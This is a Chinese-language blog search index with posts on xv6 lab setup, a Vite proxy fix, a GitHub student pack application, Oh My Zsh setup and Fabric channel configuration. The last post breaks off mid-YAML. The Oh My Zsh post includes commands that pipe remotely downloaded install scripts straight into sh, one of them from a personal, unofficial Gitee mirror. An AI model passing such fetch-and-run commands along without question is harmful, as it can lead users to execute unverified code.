<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MIT 6.s081 (6.1810) 学习记录-Lab1-Xv6 and Unix utilities</title>
      <link href="/posts/56b8106d.html"/>
      <url>/posts/56b8106d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程地址：<a href="https://pdos.csail.mit.edu/6.S081/2023/labs/util.html">https://pdos.csail.mit.edu/6.S081/2023/labs/util.html</a></p></blockquote><h3 id="基础环境">基础环境</h3><p>首先要根据<a href="https://pdos.csail.mit.edu/6.S081/2023/tools.html">lab tools page</a> 配置Linux环境，我使用的是Ubuntu 22.04的服务器版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu </span><br></pre></td></tr></table></figure><h3 id="环境测试">环境测试</h3><p>由于本实验的运行环境在RISC-V架构下，所以需要测试在RISC-V的基本环境下是否可以正常编译并运行xv6系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">版本检查</span></span><br><span class="line">qemu-system-riscv64 --version</span><br><span class="line">riscv64-linux-gnu-gcc --version</span><br></pre></td></tr></table></figure><h3 id="获取并启动xv6（easy）">获取并启动xv6（<a href="https://pdos.csail.mit.edu/6.S081/2023/labs/guidance.html">easy</a>）</h3><h4 id="从git仓库中获取xv6源代码">从git仓库中获取xv6源代码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone git://g.csail.mit.edu/xv6-labs-2023</span><br><span class="line">cd xv6-labs-2023</span><br></pre></td></tr></table></figure><h4 id="编译并运行xv6">编译并运行xv6</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make qemu</span><br></pre></td></tr></table></figure><p>启动后应该会有如下输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -global virtio-mmio.force-legacy=false -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0</span><br><span class="line"></span><br><span class="line">xv6 kernel is booting</span><br><span class="line"></span><br><span class="line">hart 1 starting</span><br><span class="line">hart 2 starting</span><br><span class="line">init: starting sh</span><br><span class="line"><span class="meta prompt_">$ </span></span><br></pre></td></tr></table></figure><p>此时xv6系统已经正常启动，并且已经启动sh终端，在<code>$</code>的提示符后输入<code>ls</code>会显示当前文件夹的输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">.              1 1 1024</span><br><span class="line">..             1 1 1024</span><br><span class="line">README         2 2 2305</span><br><span class="line">xargstest.sh   2 3 93</span><br><span class="line">cat            2 4 32848</span><br><span class="line">echo           2 5 31696</span><br><span class="line">forktest       2 6 15824</span><br><span class="line">grep           2 7 36224</span><br><span class="line">init           2 8 32192</span><br><span class="line">kill           2 9 31656</span><br><span class="line">ln             2 10 31480</span><br><span class="line">ls             2 11 34784</span><br><span class="line">mkdir          2 12 31712</span><br><span class="line">rm             2 13 31704</span><br><span class="line">sh             2 14 54144</span><br><span class="line">stressfs       2 15 32584</span><br><span class="line">usertests      2 16 180624</span><br><span class="line">grind          2 17 47536</span><br><span class="line">wc             2 18 33800</span><br><span class="line">zombie         2 19 31064</span><br><span class="line">console        3 20 0</span><br></pre></td></tr></table></figure><p>此时一个简单的xv6操作系统就启动好了，如果要在Linux终端中退出xv6，需要按下<code>Ctrl+A</code>然后按下<code>X</code>回到正常的Linux终端</p><h3 id="实现用户级sleep程序-easy">实现用户级sleep程序 (<a href="https://pdos.csail.mit.edu/6.S081/2023/labs/guidance.html">easy</a>)</h3>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> MIT 6.s081 </tag>
            
            <tag> MIT 6.1810 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue+Arco Design Pro配置proxy跨域代理</title>
      <link href="/posts/c6ad2573.html"/>
      <url>/posts/c6ad2573.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近在使用Arco Design+Vue进行一个后台管理系统的开发，目前后端的API与前端不在同一台ip上，直接进行请求会出现跨域问题</p></blockquote><h3 id="介绍">介绍</h3><p>使用<code>arco init hello-arco-pro</code>命令配置好的Arco Design Pro项目是通过Vite进行启动的，Vite在进行配置的时候，可以对前端服务器的代理规则进行自定义配置，实现跨域API的访问请求。Vite Proxy的大致原理可以参考下图（源自<a href="https://blog.csdn.net/weixin_43288600/article/details/130919316">CSDN@南木元元</a>）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20240702012441.png" alt=""></p><h3 id="配置方法">配置方法</h3><p>在Arco Design Pro的项目目录中，通常会存在一个config文件夹<code>hello-arco-pro/config</code>，config目录结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">├── plugin</span><br><span class="line">├── utils</span><br><span class="line">├── vite.config.base.ts</span><br><span class="line">├── vite.config.dev.ts</span><br><span class="line">└── vite.config.prod.ts</span><br></pre></td></tr></table></figure><p>打开<code>vite.config.dev.ts</code>文件（通常来说使用<code>npm run dev</code>命令调用的就是这个配置文件），在server选项下添加proxy（如果没有server则手动添加）：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server</span>: &#123;</span><br><span class="line">      <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/api1&#x27;</span>: &#123;</span><br><span class="line">          <span class="attr">target</span>: <span class="string">&#x27;http://10.0.0.60:8080&#x27;</span>,</span><br><span class="line">          <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">rewrite</span>: <span class="function">(<span class="params">path</span>) =&gt;</span> path.<span class="title function_">replace</span>(<span class="regexp">/^\/api1/</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里表示所有对<code>/api1</code>的访问都会被代理转换为对<code>http://10.0.0.60:8080</code>的访问，使用rewrite会将原有aAPI请求中的<code>'/api1'</code>替换为<code>''</code>，例如在前端Vue代码中所请求的API为<code>/api1/dashboard/workplace</code>，通过代理会被转换为实际上是对<code>http://10.0.0.60:8080/dashboard/workplace</code>的访问，以此来解决跨域问题</p><blockquote><p>[!NOTE]</p><p>通常来说一个Vite代理的配置到这里就可以结束了，但是我在自己配置的时候，配置完依然不能实现跨域访问，会出现<code> (failed)net::ERR_CONNECTION_REFUSED</code>错误状态，查看请求URL发现实际请求的是<code>http://localhost:8080/api1/dashboard/workplace</code>。</p></blockquote><p>在搜索大量资料后，找到对应解决方案如下，在<code>hello-arco-pro</code>目录下会存在一个环境变量文件<code>.env.development</code>，里面的内容配置了Vite调用API时的基础URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VITE_API_BASE_URL= &#x27;http://localhost:8080&#x27;</span><br></pre></td></tr></table></figure><p>这与刚才看到的实际请求URL是相符的，将文件中的此行配置删除，即可解决问题，实现跨域API的正常访问</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 前端 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统CMU15445 Project</title>
      <link href="/posts/38e6babe.html"/>
      <url>/posts/38e6babe.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前置配置">1.前置配置</h2><blockquote><p>这里我使用VSCode连接自己的一台服务器，服务器的版本为Ubuntu 22.04.4 LTS</p></blockquote><h4 id=""></h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 GitHub Student Developer Pack 学生开发包申请指南</title>
      <link href="/posts/946c99e6.html"/>
      <url>/posts/946c99e6.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106172117877.png" alt="image-20240106172117877"></p><h2 id="准备材料">准备材料</h2><ol><li>Github账号（自行申请，任意邮箱均可）</li><li>教育邮箱（edu.cn后缀的学校邮箱）</li><li>学信网的个人学籍在线验证报告</li></ol><h2 id="账号个人信息设置">账号个人信息设置</h2><h3 id="开启2FA双因素认证">开启2FA双因素认证</h3><p>开启地址：<a href="https://github.com/settings/security">https://github.com/settings/security</a> ，点击绿色按钮进行2FA配置</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106145925807.png" alt="image-20240106145925807"></p><p>进入到2FA配置页面点击<code>setup key</code>获取2FA密钥</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106151457874.png" alt="image-20240106151457874"></p><p>将密钥添加到2FA验证器中添加，这里推荐使用浏览器插件（<a href="https://chromewebstore.google.com/detail/bhghoamapcdpbohphigoooaddinpkbai?hl=zh-CN">身份验证器</a>）进行2FA验证码生成</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106151221446.png" alt="image-20240106151221446"></p><p>以身份验证器为例，添加密钥认证的过程如下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106152119547.png" alt="image-20240106152119547"></p><p>添加完成后每隔固定时间会自动生成六位数验证码，将验证码填入到GitHub中申请验证的位置</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106152707307.png" alt="image-20240106152707307"></p><p>随后保存验证器恢复代码到本地用于防止验证器丢失</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106152858926.png" alt="image-20240106152858926"></p><p>出现此界面说明2FA验证器添加成功</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106152957559.png" alt="image-20240106152957559"></p><h3 id="完善公开资料信息">完善公开资料信息</h3><p>地址：<a href="https://github.com/settings/profile">https://github.com/settings/profile</a> ，主要完善图中的必要信息</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20240107114712.png" alt="12"></p><h3 id="添加账单信息">添加账单信息</h3><p>设置地址：<a href="https://github.com/settings/billing/payment_information">https://github.com/settings/billing/payment_information</a> ，只需填写带* 的部分必填信息并保存（此处姓名以张三为例）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240107114815575.png" alt="image-20240107114815575"></p><h2 id="申请过程">申请过程</h2><div class="note warning simple"><p>注意在申请过程尽量不要使用代理，使用学校及附近的真实网络环境进行申请，官方会根据IP判断是否在学校附近，由于断开代理环境访问GitHub可能会比较慢，需要耐心等待网页加载</p></div><h3 id="添加邮箱">添加邮箱</h3><p>GitHub benefits申请地址：<a href="https://education.github.com/discount_requests/application">https://education.github.com/discount_requests/application</a> ，选择&quot;Student&quot;身份</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202401061357784.png" alt="image-20240106020053930"></p><p>选择教育邮箱地址，如果没有则使用下方<code>Add an email address</code>进行添加</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202401061357370.png" alt="image-20240106020827370"></p><p>根据提示到Github的个人设置中进行添加：<a href="https://github.com/settings/emails">https://github.com/settings/emails</a></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106144211318.png" alt="image-20240106144211318"></p><p>添加完成后会向邮箱中发一封验证邮件，验证通过后会在邮箱旁出现认证通过的学校名称，然后可以进行后续步骤</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240107115459102.png" alt="image-20240107115459102"></p><h3 id="上传学信网学籍验证报告">上传学信网学籍验证报告</h3><p>邮箱添加完成后点击&quot;Continue&quot;按钮</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202401061357024.png" alt="image-20240106020907905"></p><p>这里需要提前准备好<code>学信网学籍证明</code>，并确保手机或者电脑的摄像头是可用状态</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202401061357841.png" alt="image-20240106020923802"></p><p>上传成功后如下图所示，然后提交信息</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106171303210.png" alt="image-20240106171303210"></p><blockquote><p>推荐使用有道词典的截图翻译将学籍报告翻译成英文，上传后识别更准确</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240107123902097.png" alt="image-20240107123902097"></p></blockquote><div class="note warning simple"><p>根据设备、浏览器及网络情况等种种不同，照片下方可能会出现或不出现upload按钮以及proof type选项，如果有的话，尽量还是选择拍照而不是upload，然后proof type选other，弹出来来的附加信息框里填Online Verification Report of Student Status</p></div><p>提交成功后会即时返回审核结果，提示&quot;Approved&quot;则为审核通过</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106171522960.png" alt="image-20240106171522960"></p><p>通过后等待1~2周变为下图状态时即可享用GitHub Student Developer Pack的权益</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106171741050.png" alt="image-20240106171741050"></p><h2 id="Rejected集锦">Rejected集锦</h2><p>若申请结果为<code>Rejected</code>则表明提交的材料审核不通过，需要根据具体原因进行调整</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20240106172407069.png" alt="image-20240106172407069"></p><ol><li><p>You must secure your GitHub account by enabling <a href="https://github.com/settings/security">2FA</a> and complete your <a href="https://github.com/settings/billing/payment_information">billing information</a>.</p><blockquote><p>2FA验证和账单信息未完善，需进入相应链接进行完善</p><p>类似原因的其他驳回建议：</p><ul><li>Please secure your GitHub account with <a href="https://github.com/settings/security">two-factor authentication</a>. You may need to log out and log back in to GitHub before re-applying.</li><li>You are unlikely to be verified until you have completed your <a href="https://github.com/settings/billing/payment_information">GitHub billing information</a> with your full name exactly as it appears in your academic affiliation document. You do not have to add a payment method. You may need to log out and log back in to GitHub before re-applying.</li></ul></blockquote></li><li><p>The school you selected does not appear to have a campus location in your country. Your school-provided academic affiliation document must indicate virtual learning if you are remote. If you believe that the school you have applied for has incorrect information that affects your current application e.g. incorrect email domain, please select ‘My selected school has incorrect or incomplete information e.g. domains or campus location’ option when submitting a GitHub Education support ticket.</p><blockquote><p>申请学生包时的地理位置不正确，通常原因是申请时开启代理或者所在地址位置IP不在学校所在地附近，建议在学校附近或使用校园网进行申请</p><p>类似原因的其他驳回建议：</p><ul><li>You appear not to be near any campus location for the school you have selected. Your academic affiliation documentation must indicate virtual learning if you are remote. Your must configure your browser and operating system to allow location access. You may not use a VPN. If you believe that our information about your school is incomplete or incorrect e.g. missing campus location(s), then please select ‘My selected school has incorrect or incomplete information e.g. domains or campus location’ option when submitting a GitHub Education support ticket.</li></ul></blockquote></li><li><p>Please correct your <a href="https://github.com/settings/billing/payment_information">GitHub billing information</a> with your last name exactly as it appears in your academic affiliation document. If you have only a single legal name, enter it in both the first and last name fields.</p><blockquote><p>账单信息中的姓名与学籍验证报告中的姓名不匹配，在填写时需要姓和名一一对应（eg. 姓名：张三，对应地 First Name: San, Last Name: Zhang）,建议采用翻译件拍照上传，姓名识别更准确。如果多次上传仍然提示name错误，可尝试在账单信息中调换姓和名的顺序。</p><p>类似原因的其他驳回建议：</p><ul><li>Please correct your <a href="https://github.com/settings/billing/payment_information">GitHub billing information</a> with your first name exactly as it appears in your academic affiliation document. Do not use a variation of your name or a nickname.</li></ul></blockquote></li><li><p>Please select proof type ‘Other’ for this image.</p><blockquote><p>页面始终未出现选择证明类型的表单，原因暂时未知。</p><p><a href="https://github.com/orgs/community/discussions/67955">#67955</a>提及上传学生卡/学生证照片可通过</p></blockquote></li><li><p>The GitHub account you are using was recently created, and you appear to be having difficulty demonstrating your academic affiliation. Please wait a few days then try again.</p><blockquote><p>GitHub账号注册时间过短无法申请学生包，过几天再试</p></blockquote></li></ol><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>感谢<a href="https://github.com/AngelMooney">@AngelMooney</a>为本文提供了许多宝贵建议与高质量素材</p></div>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oh-My-Zsh 安装&amp;配置</title>
      <link href="/posts/7bcf35fc.html"/>
      <url>/posts/7bcf35fc.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近多次重复配置Linux环境，每次都要重新搜索教程重新配置终端，在此对终端配置过程进行一个汇总，使用Oh My Zsh对终端进行美化</p></blockquote><h2 id="下载与安装">下载与安装</h2><p>安装Oh My Zsh首先要安装Zsh，本文操作都在Ubuntu下进行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure><p>然后安装Oh My Zsh，可以通过curl或wget的方式进行安装，每种方式提供Github和国内镜像两种下载渠道</p><h3 id="curl安装">curl安装</h3><h5 id="Github">Github</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure><h5 id="Gitee">Gitee</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure><h3 id="wget安装">wget安装</h3><h5 id="Github-2">Github</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span><br></pre></td></tr></table></figure><h5 id="Gitee-2">Gitee</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(wget -O- https://gitee.com/pocmon/mirrors/raw/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure><p>至此，Oh My Zsh就安装完毕了，但是还没有达到自己想要的美化的程度</p><h2 id="主题配置">主题配置</h2><p>Oh My Zsh默认会自带一些主题，个人通常喜欢用Powerlevel10k</p><h3 id="Powerlevel10k安装">Powerlevel10k安装</h3><h4 id="Github-3">Github</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth=1 https://github.com/romkatv/powerlevel10k.git $&#123;ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom&#125;/themes/powerlevel10k</span><br></pre></td></tr></table></figure><h4 id="Gitee-3">Gitee</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git $&#123;ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom&#125;/themes/powerlevel10k</span><br></pre></td></tr></table></figure><h3 id="Powerlevel10k配置">Powerlevel10k配置</h3><p>在Zsh的配置文件<code>~/.zshrc</code>中将主题改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</span><br></pre></td></tr></table></figure><p>修改完成并保存后需要重新应用一下配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>应用后新主题会自动进行一些问题的询问来帮助配置主题样式</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20230704151727.png" alt=""></p><p>通过询问与选择后可以达到的终端样式如下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20230704151848.png" alt=""></p><p>询问过程退出后如果想重新进入这个配置过程可以在终端中输入下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure><blockquote><p>使用Powerlevel10k主题时，会有很多图标在终端显示，需要终端字体支持才可以显示完整，我个人使用的是 <a href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.0.2/CodeNewRoman.zip">CodeNewRoman Nerd Font</a>，官方推荐的字体为<a href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.0.2/Meslo.zip">Meslo Nerd Font</a>。同时还有其他<a href="https://www.nerdfonts.com/font-downloads">Nerd Font</a>字体可供选择。</p></blockquote><h2 id="插件的安装">插件的安装</h2><p>在Oh My Zsh中有很多插件可供使用，其中最常用的是<code>zsh-autosuggestions</code>和<code>zsh-syntax-highlighting</code></p><p>通常使用下面的命令进行插件的安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>安装完成后在配置文件<code>~/.zshrc</code>中添加对应的插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=( </span><br><span class="line">    # other plugins...</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>修改完成后重启Zsh或者使用source命令应用配置文件</p><h2 id="卸载Oh-My-Zsh">卸载Oh My Zsh</h2><p>终端输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uninstall_oh_my_zsh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Oh-My-Zsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go SDK搭建多通道多orderer节点的Fabric环境</title>
      <link href="/posts/5233648.html"/>
      <url>/posts/5233648.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>书接上回，之前利用<a href="(https://github.com/sxguan/fabric-go-sdk)">fabric-go-sdk</a>的项目进行修改，成功创建起了多组织多对等节点的Fabric网络，但这远远不能满足正常开发使用的需求。本文将基于之前的工作内容，逐步实现多通道多排序节点的Fabric网络，并对创建以及踩坑过程做一个简单记录。</p></blockquote><h2 id="多通道搭建">多通道搭建</h2><h3 id="组织结构">组织结构</h3><p>在之前已经搭建出3个组织，每个组织有2个peer节点的Fabric网络的基础上，多通道的方案计划使用3条通道进行划分，其中Org1的peer0、peer1和Org3的peer0加入Channel1，Org2的peer0、peer1和Org3的peer1加入Channel2，Org3的peer0、peer1加入Channel3，具体示意图如下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202208112105586.png" alt="多通道示意图"></p><h3 id="配置文件修改">配置文件修改</h3><h4 id="fixtures">fixtures</h4><p>网络结构发生了变化，只需对生成通道以及相关锚节点的配置文件<code>configtx.yaml</code>进行修改。对于<code>crypto-config.yaml</code>和<code>docker-compose.yaml</code>这两个文件与通道的配置没有关系，故不用作任何改动。</p><p>在<code>configtx.yaml</code>中只需要按照网络结构修改<code>Profiles</code>选项即可，这里直接贴出修改后的相关配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Profiles:</span></span><br><span class="line">    <span class="attr">OrdererGenesis:</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelDefaults</span></span><br><span class="line">        <span class="attr">Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line">            <span class="attr">Organizations:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*OrdererOrg</span></span><br><span class="line">            <span class="attr">Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line">        <span class="attr">Consortiums:</span></span><br><span class="line">            <span class="attr">SampleConsortium:</span></span><br><span class="line">                <span class="attr">Organizations:</span></span><br><span class="line">                    <span class="bullet">-</span> <span class="meta">*Org1</span></span><br><span class="line">                    <span class="bullet">-</span> <span class="meta">*Org2</span></span><br><span class="line">                    <span class="bullet">-</span> <span class="meta">*Org3</span></span><br><span class="line">    <span class="attr">ChannelOne:</span></span><br><span class="line">        <span class="attr">Consortium:</span> <span class="string">SampleConsortium</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelDefaults</span></span><br><span class="line">        <span class="attr">Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line">            <span class="attr">Organizations:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org1</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org3</span></span><br><span class="line">            <span class="attr">Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br><span class="line">    <span class="attr">ChannelTwo:</span></span><br><span class="line">        <span class="attr">Consortium:</span> <span class="string">SampleConsortium</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelDefaults</span></span><br><span class="line">        <span class="attr">Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line">            <span class="attr">Organizations:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org2</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org3</span></span><br><span class="line">            <span class="attr">Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br><span class="line">    <span class="attr">ChannelThree:</span></span><br><span class="line">        <span class="attr">Consortium:</span> <span class="string">SampleConsortium</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelDefaults</span></span><br><span class="line">        <span class="attr">Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line">            <span class="attr">Organizations:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org3</span></span><br><span class="line">            <span class="attr">Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span 